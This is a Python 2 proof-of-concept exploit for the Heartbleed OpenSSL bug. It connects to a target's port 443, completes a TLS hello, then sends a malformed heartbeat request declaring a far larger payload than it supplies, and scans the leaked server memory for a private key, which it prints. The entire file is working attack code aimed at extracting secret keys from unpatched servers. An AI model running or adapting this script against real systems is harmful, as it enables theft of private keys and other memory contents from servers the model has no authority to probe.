#!/usr/bin/python

import sys
import socket
import struct
import string

def h2bin(x):
    return x.replace(' ', '').replace('\n', '').decode('hex')

hello = h2bin('''
16 03 02 00  dc 01 00 00 d8 03 02 53
43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c
c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09
c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44
c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c
c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04
03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19
00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
00 0f 00 01 01
''') #request that loads the PK in the right memory space

heartbeat = h2bin('''
18 03 02 00 03
01 40 00
''') #heartbeat request that specify a payload length bigger than supplied

# connecting to server
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((sys.argv[1],443))

#sending package hello to start handshake
s.send(hello)

#looping to receive data from server
while True:
    header = s.recv(5) #getting header
    typ, version, length =  struct.unpack('>BHH', header)
    buff = ''
    #receiving response to hello message
    while length:
        rec = s.recv(length)
        buff+= rec
        length-= len(rec)

    #check if hello message is finished
    if typ == 22 and ord(buff[0]) == 0x0E:
        break

#attacking server for heartbleed

s.send(heartbeat)

header = s.recv(5) #getting header
typ, version, length =  struct.unpack('>BHH', header)
buff = ''
#receiving response to heartbeat message
while length:
    rec = s.recv(length)
    buff+= rec
    length-= len(rec)

#check if message is heartbeat (type 24) and if length is bigger thatn suposed to
if typ == 24 and len(buff) > 3:
    #server bleeded more info than suposed
    print "server responded heartbeat with:"

    response = ''

    for c in buff:
        response += ''.join((c if 32 <= ord(c) <= 126 else ' ' ))

    keysize = string.find(response,"-----END PRIVATE KEY-----") -  string.find(response,"BEGIN PRIVATE KEY-----") + 22

    print "-----BEGIN PRIVATE KEY-----"

    print response[string.find(response,"BEGIN PRIVATE KEY-----") + 22 :keysize]

    print "-----END PRIVATE KEY-----"

    print
else:
    print "Server did not bled private key"


